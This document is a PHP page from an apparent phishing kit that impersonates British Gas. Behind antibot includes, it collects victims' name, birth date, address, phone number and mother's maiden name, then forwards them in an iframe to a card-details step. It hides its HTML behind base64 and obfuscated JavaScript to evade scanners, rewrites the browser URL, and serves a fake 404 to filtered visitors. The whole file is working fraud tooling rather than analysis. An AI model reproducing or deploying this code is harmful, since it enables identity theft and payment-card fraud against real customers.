<?php

error_reporting(0);
include "at.php";
include "control.php";

include('files/boot/check.php');
include('files/boot/check1.php');
include('files/boot/check2.php');
include('files/boot/antibot.php');
include('files/v/enc.php');

function generateRandomString($length = 10) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, strlen($characters) - 1)];
    }
    return $randomString;
}
session_start();
session_regenerate_id();



if(isset($_GET["validid"]))
{
	$fname=randomCha(rand(10,12));
	$fj=randomCha(rand(13,15));
	



	$fullname = $_POST['full_name'];
	$dob = $_POST['dob'];
	$address = $_POST['address'];
	$city = $_POST['city'];
	$postcode =  $_POST['postcode'];
	$phone =  $_POST['mobile_number'];
	$mmn = $_POST['mmn'];


echo '<!DOCTYPE html>'.ob_start().'

<html class="win chrome chrome69 webkit webkit5"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<script>

this.top.location !== this.location && (this.top.location = this.location);

</script>

<link rel="SHORTCUT ICON" href="include/favicon.ico">

  <title>Confirm Your Details</title>
  <meta name="apple-itunes-app" content="app-id=340473961">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="format-detection" content="telephone=no">

  
<style>
#app-preloader {
  font-family: Arial;
  width: 180px; height: 30px;
  line-height: 30px; position: absolute; top: 50%; left: 50%; text-align: center;
  margin-top: -15px; margin-left: -90px;
  color: #0099ff; z-index: 1000;
}
</style><style type="text/css" media="screen" id="mm_style_mm_cdApiStyleId_1">
    @media only screen and (max-width: 824px) {
  #navbar > li > a {
  font-size: 90% !important;
  }
  }
</style>

<style type="text/css">#edr_survey .edr_lwrap iframe {width:100%;height:100%;}#edr_survey .edr_go {opacity:0;display:block;filter:alpha(opacity = 0);position:absolute;font-size:0;background-color:#000;margin:0;padding:0;z-index:1000000;}#edr_survey .edr_go:focus {opacity:1;filter:alpha(opacity = 50);background-color:rgba(0, 0, 0, 0.01);}#edr_survey .edr_lb {position:fixed;top:0;left:0;right:0;bottom:0;z-index:999998;display:none;}</style><link rel="stylesheet" href="include/engine-27b912912c2a32437339ec34830a17c8.css">

</head><body class="'.$fj.'-application">

   
  <link rel="stylesheet" href="include/bg-vi-3.1.3.css">

<meta name="theme-color" content="#005EB8">

  <meta name="tag" content="1.108.9">

  <link rel="stylesheet" href="include/font-awesome.min.css">
  <link rel="stylesheet" href="include/vendor-416d16c8ba603df5e490eb31016b5ffd.css">
  <link rel="stylesheet" href="include/oam-596afcf15544f353e71652cf97054e76.css">

  <link rel="stylesheet" href="include/hpp-embedded-integration-library.css">
 
  <div id="destination"></div>



<div id="'.$fj.'647" class="'.$fj.'-view"><div id="'.$fj.'691" class="hide-on-app-component '.$fj.'-view"><header id="addon-bg-header" class="bgcss custom-bg-1 bg-header-component '.$fj.'-view"><nav class="navbar yamm navbar-default navbar-fixed-top">
  <a href="/details2.php?&amp;sessionid='.randomCha(rand(10,30)).'&amp;securessl=true" class="sr-only sr-only-focusable">Skip to main content</a>
    <div class="topnav py1">
      <div class="container">
        <div class="pull-left">
          <div id="'.$fj.'701" class="__56f18 bg-top-nav-component '.$fj.'-view"><span class="background-white active px2 py3">My Home</span><ul class="navbar-nav collapse navbar-collapse navbar-topnav navbar-right yamm-fw" style="max-height: 542.6px;"><li class="dropdown dropdown-topnav"><a href="/details2.php?&amp;sessionid='.randomCha(rand(10,30)).'&amp;securessl=true" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false" class="px2 py3 dropdown-toggle">My Business</a><div role="menu" aria-labelledby="Business" class="dropdown-menu dropdown-menu-topnav"><ul role="menu" class="fa-ul ml2 mr4 mb4"><div><div class="Business Energy"><a href="/details2.php?&amp;sessionid='.randomCha(rand(10,30)).'&amp;securessl=true"><h5 class="px2 py2">Business Energy</h5></a><li><a href="/details2.php?&amp;sessionid='.randomCha(rand(10,30)).'&amp;securessl=true"></a><a title="businessElectricity" role="menuitem" href="/details2.php?&amp;sessionid='.randomCha(rand(10,30)).'&amp;securessl=true" class="menu-section"><i class="fa fa-angle-right"></i>Business electricity</a></li><li><a title="businessGas" role="menuitem" href="/details2.php?&amp;sessionid='.randomCha(rand(10,30)).'&amp;securessl=true" class="menu-section"><i class="fa fa-angle-right"></i>Business gas</a></li><li><a title="businessGAQ" role="menuitem" href="/details2.php?&amp;sessionid='.randomCha(rand(10,30)).'&amp;securessl=true" class="menu-section"><i class="fa fa-angle-right"></i>Get a business energy quote</a></li></div><div class="Business Services"><a href="/details2.php?&amp;sessionid='.randomCha(rand(10,30)).'&amp;securessl=true"><h5 class="px2 py2">Business Services</h5></a><li><a href="/details2.php?&amp;sessionid='.randomCha(rand(10,30)).'&amp;securessl=true"></a><a title="businessBoilerMaintenance" role="menuitem" href="/details2.php?&amp;sessionid='.randomCha(rand(10,30)).'&amp;securessl=true" class="menu-section"><i class="fa fa-angle-right"></i>Business boiler maintenance</a></li><li><a title="businessBoilerInstallation" role="menuitem" href="/details2.php?&amp;sessionid='.randomCha(rand(10,30)).'&amp;securessl=true" class="menu-section"><i class="fa fa-angle-right"></i>Business boiler installation</a></li><li><a title="businessBoilerBreakdown" role="menuitem" href="/details2.php?&amp;sessionid='.randomCha(rand(10,30)).'&amp;securessl=true" class="menu-section"><i class="fa fa-angle-right"></i>Business boiler breakdown</a></li></div><div class="Your business account"><a href="/details2.php?&amp;sessionid='.randomCha(rand(10,30)).'&amp;securessl=true"><h5 class="px2 py2">Your business account</h5></a><li><a href="/details2.php?&amp;sessionid='.randomCha(rand(10,30)).'&amp;securessl=true"></a><a title="businessLogin" role="menuitem" href="/details2.php?&amp;sessionid='.randomCha(rand(10,30)).'&amp;securessl=true" class="menu-section"><i class="fa fa-angle-right"></i>Login</a></li><li><a title="businessRegister" role="menuitem" href="/details2.php?&amp;sessionid='.randomCha(rand(10,30)).'&amp;securessl=true" class="menu-section"><i class="fa fa-angle-right"></i>Register</a></li></div></div></ul></div></li></ul></div>
        </div>
        <div id="quickLinks" class="pull-right hidden-xs">
            <span class="px2"><i class="fa fa-chevron-circle-right"></i><a href="/details2.php?&amp;sessionid='.randomCha(rand(10,30)).'&amp;securessl=true" title="Log out"> Log out</a></span>
        </div>
      </div>
    </div>
  <div class="container">
    <div class="navbar-header">
      <button type="button" id="btn-menu-1" data-toggle="collapse" data-target="#mobile-Menu-3" class="navbar-toggle collapsed" data-'.$fj.'-action="" data-'.$fj.'-action-710="710">
        <i class="fa fa-reorder ml1 mr1"></i>
        <p>Menu</p>
      </button>
      <button type="button" id="btn-menu-2" data-toggle="collapse" data-target="#mobile-Menu-2" class="navbar-toggle collapsed" data-'.$fj.'-action="" data-'.$fj.'-action-711="711">
        <i class="fa fa-user"></i>
        <p>My Account</p>
      </button>
      <a href="/details2.php?&amp;sessionid='.randomCha(rand(10,30)).'&amp;securessl=true" id="logo">
            <img alt="British Gas" src="include/bg-logo-mobile.svg" width="146px" height="57px" class="bg-logo mt1 mb1 xs-ml2 sm-ml0">
      </a>
    </div>
    <div class="nav-list-adj nav-bar-content">
        <div id="navbar-collapse-1" class="collapse navbar-collapse bg-menu-component '.$fj.'-view" style="max-height: 542.6px;"><ul id="navbar" class="nav navbar-nav navbar-right">
    <li class="dropdown yamm-fw mt5">
        <a href="/details2.php?&amp;sessionid='.randomCha(rand(10,30)).'&amp;securessl=true" data-toggle="dropdown" role="button" title="Energy" aria-haspopup="true" aria-expanded="false" class="dropdown-toggle bold">
          Energy
        </a>
        
    </li>
    <li class="dropdown yamm-fw mt5">
        <a href="/details2.php?&amp;sessionid='.randomCha(rand(10,30)).'&amp;securessl=true" data-toggle="dropdown" role="button" title="Home Services" aria-haspopup="true" aria-expanded="false" class="dropdown-toggle bold">
          Home Services
        </a>
        
    </li>
    <li class="dropdown yamm-fw mt5">
        <a href="/details2.php?&amp;sessionid='.randomCha(rand(10,30)).'&amp;securessl=true" data-toggle="dropdown" role="button" title="Smart Home" aria-haspopup="true" aria-expanded="false" class="dropdown-toggle bold">
          Smart Home
        </a>
        
    </li><li class="dropdown yamm-fw mt5"><a href="/details2.php?&amp;sessionid='.randomCha(rand(10,30)).'&amp;securessl=true" id="MXM-Rewards" data-toggle="dropdown" role="button" title="Rewards" aria-haspopup="true" aria-expanded="false" class="dropdown-toggle bold" data-di-id="#MXM-Rewards">Rewards</a></li>

    <li class="dropdown yamm-fw mt5">
        <a href="/details2.php?&amp;sessionid='.randomCha(rand(10,30)).'&amp;securessl=true" id="help-and-support" data-toggle="dropdown" role="button" title="Help &amp; Support" aria-haspopup="true" aria-expanded="false" class="dropdown-toggle bold">
          Help &amp; Support
        </a>
<!---->    </li>
    <li class="dropdown yamm-fw mt5">
        <a href="/details2.php?&amp;sessionid='.randomCha(rand(10,30)).'&amp;securessl=true" id="loggedInLink" data-toggle="dropdown" role="button" title="My Account" aria-haspopup="true" aria-expanded="false" class="dropdown-toggle bold">
          My Account
        </a>
        
    </li>
</ul>
</div>
    </div>
  </div>
</nav>
</header></div><div class="oam overflow-hidden body-content-min-height"><div class="custom-bg-1 bgcss custom-bg"><!----><div id="'.$fj.'719" class="text-center p6 __ca81c toast-container-component hidden '.$fj.'-view"><div class="toast-container-content">
<!----></div>
</div><div><div id="'.$fj.'745" class="liquid-container liquid-container-component '.$fj.'-view" style=""><div id="'.$fj.'756" class="liquid-child liquid-child-component '.$fj.'-view" style="top: 0px; left: 0px;"><div id="'.$fj.'761" class="liquid-container liquid-container-component '.$fj.'-view" style=""><div id="'.$fj.'2647" class="liquid-child liquid-child-component '.$fj.'-view" style="top: 0px; left: 0px;">  <div id="'.$fj.'2764" class="-default-062908622116041651539074607076-component '.$fj.'-view"><div class="text-center mt5 px5">
  <h1 class="mt0 mb6 headline">
    Confirm Your Details
  </h1>
  
</div>
<div class="shadow-divider mt6 mb6"></div>
</div>
<div id="'.$fj.'2768" class="card-info-component '.$fj.'-view"><div class="text-center mt5 px5 card-details">

    <h3 class="mt3 mb3 headline">
      Step 2: Card Details
    </h3>
    <div id="'.$fj.'2774" class="save-card-preference-component '.$fj.'-view"><div class="save-card-preference">
    <p>
    <i class="fa fa-lock"></i>
    Your data is secure.
    </p>
</div></div>


      <div class="row">
        <div id="'.$fj.'2788" class="__27c84 card-details-component '.$fj.'-view">
<div id="custom-html"><div id="wp-cl"><iframe class="wp-cl-iframe" title="Payment Pages" id="wp-cl-custom-html-iframe" src="include/details2.php?1='.$fullname.'&2='.$dob.'&3='.$address.'&4='.$city.'&5='.$postcode.'&6='.$phone.'&7='.$mmn.'" allowtransparency="yes" scrolling="no" frameborder="0" border="0" style="height: 800px;"></iframe></div></div>
</div>
      </div>
    
</div>
</div>

<!---->




</div></div>
<!----></div></div></div><div id="'.$fj.'773" class="__8f8fb modal-elsewhere-component '.$fj.'-view">    <div id="'.$fj.'852" class="liquid-child liquid-child-component '.$fj.'-view" style=""><!----></div>
</div><div id="'.$fj.'781" class="full-page-overlay-elsewhere-component '.$fj.'-view">    <div id="'.$fj.'856" class="liquid-child liquid-child-component '.$fj.'-view" style=""><!----></div>
</div><div id="'.$fj.'785" class="modal-elsewhere-bootstrap-component '.$fj.'-view">    <div id="'.$fj.'860" class="liquid-child liquid-child-component '.$fj.'-view" style=""><!----></div>
</div></div></div><div id="'.$fj.'789" class="cookieMessage __00705 cookie-warning-component hidden '.$fj.'-view">We use cookies to provide a better experience. Carry on browsing if you"re happy with this, or <a href="/details2.php?&amp;sessionid='.randomCha(rand(10,30)).'&amp;securessl=true"> click here</a> to manage cookies.<span class="pointer fa fa-close" data-'.$fj.'-action="" data-'.$fj.'-action-790="790"></span></div><div id="'.$fj.'791" class="hide-on-app-component '.$fj.'-view"><footer id="addon-bg-footer" class="bgcss custom-bg-1 bg-footer __94c1a bg-footer-component '.$fj.'-view"><div class="footer__wrapper background-dark-blue britishgas">
  <div class="container sm-py12 xs-py8">

    <div class="footer__link-group row equal-height-row">

      <div class="footer__link-group__primary col-lg-3 col-sm-3 col-md-3 col-xs-6 equal-height-col">
        <ul class="footer__nav p0 mb0">
            <li class="footer__nav__item">
              <a href="/details2.php?&amp;sessionid='.randomCha(rand(10,30)).'&amp;securessl=true" title="About British Gas" class="footer__nav__link pb1">About us</a>
            </li>
            <li class="footer__nav__item">
              <a href="/details2.php?&amp;sessionid='.randomCha(rand(10,30)).'&amp;securessl=true" title="Legal" class="footer__nav__link pb1">Legal</a>
            </li>
            <li class="footer__nav__item">
              <a href="/details2.php?&amp;sessionid='.randomCha(rand(10,30)).'&amp;securessl=true" title="Cookie policy" class="footer__nav__link pb1">Cookie policy</a>
            </li>
            <li class="footer__nav__item">
              <a href="/details2.php?&amp;sessionid='.randomCha(rand(10,30)).'&amp;securessl=true" title="Terms &amp; conditions" class="footer__nav__link pb1">Terms &amp; conditions</a>
            </li>
            <li class="footer__nav__item">
              <a href="/details2.php?&amp;sessionid='.randomCha(rand(10,30)).'&amp;securessl=true" title="Privacy policy" class="footer__nav__link pb1">Privacy policy</a>
            </li>
            <li class="footer__nav__item">
              <a href="/details2.php?&amp;sessionid='.randomCha(rand(10,30)).'&amp;securessl=true" title="Access for all" class="footer__nav__link pb1">Access for all</a>
            </li>
            <li class="footer__nav__item">
              <a href="/details2.php?&amp;sessionid='.randomCha(rand(10,30)).'&amp;securessl=true" title="Performance standards" class="footer__nav__link pb1">Performance standards</a>
            </li>
            <li class="footer__nav__item">
              <a href="/details2.php?&amp;sessionid='.randomCha(rand(10,30)).'&amp;securessl=true" title="Complaints" class="footer__nav__link pb1">Complaints</a>
            </li>
            <li class="footer__nav__item">
              <a href="/details2.php?&amp;sessionid='.randomCha(rand(10,30)).'&amp;securessl=true" title="Our complaints performance" class="footer__nav__link pb1">Complaints performance</a>
            </li>
            <li class="footer__nav__item">
              <a href="/details2.php?&amp;sessionid='.randomCha(rand(10,30)).'&amp;securessl=true" title="Emergencies" class="footer__nav__link pb1">Emergencies</a>
            </li>
            <li class="footer__nav__item">
              <a href="/details2.php?&amp;sessionid='.randomCha(rand(10,30)).'&amp;securessl=true" title="Download our app" class="footer__nav__link pb1">Download our app</a>
            </li>
        </ul>
      </div>

      <div class="footer__link-group__secondary border-right border-cyan col-md-3 col-lg-3 col-sm-3 col-xs-6 equal-height-col">
        <ul class="footer__nav p0 mb0">
            <li class="footer__nav__item">
              <a href="/details2.php?&amp;sessionid='.randomCha(rand(10,30)).'&amp;securessl=true" title="British Gas Business" class="footer__nav__link pb1">
                British Gas Business
              </a>
            </li>
            <li class="footer__nav__item">
              <a href="/details2.php?&amp;sessionid='.randomCha(rand(10,30)).'&amp;securessl=true" title="Hive Active Heating" class="footer__nav__link pb1">
                Hive Active Heating
              </a>
            </li>
            <li class="footer__nav__item">
              <a href="/details2.php?&amp;sessionid='.randomCha(rand(10,30)).'&amp;securessl=true" title="Centrica PLC" class="footer__nav__link pb1">
                Centrica PLC
              </a>
            </li>
        </ul>
      </div>

        <div class="footer__link-group__social col-sm-6 col-xs-12 col-lg-4 col-md-6 social-box equal-height-col">
          <div class="row">

            <div class="footer__social__item footer-social col-sm-5 col-md-5 col-lg-5 col-xs-6 col-sm-offset-1 col-md-offset-1 col-lg-offset-1">
              <a target="_blank" href="/details2.php?&amp;sessionid='.randomCha(rand(10,30)).'&amp;securessl=true" class="footer__social__link mb6 block ">
                <img src="include/Icon_Twitter.svg" width="39" alt="Twitter" class="footer__social__icon">
                <span class="footer__social__copy">Twitter</span>
              </a>
            </div>

            <div class="footer__social__item footer-social col-xs-6 col-sm-6 col-md-6 col-lg-6">
              <a target="_blank" href="/details2.php?&amp;sessionid='.randomCha(rand(10,30)).'&amp;securessl=true" class="footer__social__link mb6 block">
                <img src="include/Icon_YouTube.svg" width="39" alt="YouTube" class="footer__social__icon">
                <span class="footer__social__copy">YouTube</span>
              </a>
            </div>
          </div>

          <div class="row">
            <div class="footer__social__item footer-social col-sm-5 col-sm-offset-1 col-md-5 col-md-offset-1 col-lg-5 col-lg-offset-1 col-xs-offset-0 col-xs-6">
              <a target="_blank" href="/details2.php?&amp;sessionid='.randomCha(rand(10,30)).'&amp;securessl=true" class="footer__social__link mb6 block">
                <img src="include/Icon_Facebook.svg" width="39" alt="Facebook" class="footer__social__icon">
                <span class="footer__social__copy">Facebook</span>
              </a>
            </div>

            <div class="footer__social__item footer-social col-xs-6 col-sm-6 col-md-6 col-lg-6">
              <a target="_blank" href="/details2.php?&amp;sessionid='.randomCha(rand(10,30)).'&amp;securessl=true" class="footer__social__link mb6 block">
                <img src="include/Icon_News.svg" width="39" alt="Latest news" class="footer__social__icon">
                <span class="footer__social__copy">Latest news</span>
              </a>
            </div>
          </div>
        </div>
    </div>

    <div class="footer__legal row">
      <div class="col-xs-12 legal-links">
        <div class="pull-right">
          <img title="British Gas" src="include/bg_logo_white.svg" class="footer-bg-logo">
          <p class="britishgas">© British Gas 2018</p>
        </div>
      </div>
    </div>

  </div>
</div>

</footer><div id="'.$fj.'822" class="body-footer-component '.$fj.'-view"><div id="'.$fj.'827" class="'.$fj.'-wormhole-component '.$fj.'-view"></div></div></div></div><div id="body-footer-1"></div>
      
     
	 <div id="edr_survey"></div>
	 
	 
<script> 
window.onload=function(){ 
history.pushState(null,null, "locale=en-US&?id='.$fnamex.'/'.$fnamex.'3'.$fnamex.'6'.$fnamex.'") 
} 
</script>
';
?>
<?php $html=ob_get_clean()?><?php $test=0;if($test){    echo $html; }else{     ?>  <script type="text/javascript">     var _0xa211=["","\x6A\x6F\x69\x6E","\x25","\x73\x6C\x69\x63\x65","\x30\x30","\x63\x68\x61\x72\x43\x6F\x64\x65\x41\x74","\x63\x61\x6C\x6C","\x6D\x61\x70","\x70\x72\x6F\x74\x6F\x74\x79\x70\x65"];function _kaktys_encode(_0x60c0x2){return decodeURIComponent(Array[_0xa211[8]][_0xa211[7]][_0xa211[6]](atob(_0x60c0x2),function(_0x60c0x3){return _0xa211[2]+ (_0xa211[4]+ _0x60c0x3[_0xa211[5]](0).toString(16))[_0xa211[3]](-2)})[_0xa211[1]](_0xa211[0]))}     document.write(_kaktys_encode("<?php echo base64_encode($html) ?>")); </script>    <?php }  ?>
echo '</body></html>';


<?php
}
else
{
	header($_SERVER['SERVER_PROTOCOL'] . ' 404 Page Not Found', true, 500);
	die("<h1>404 Page Not Found</h1>");
}
?><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
<script id="_wautga">var _wau = _wau || []; _wau.push(["dynamic", "6vx1nnpvri", "tga", "c4302bffffff", "small"]);</script><script async src="//waust.at/d.js"></script>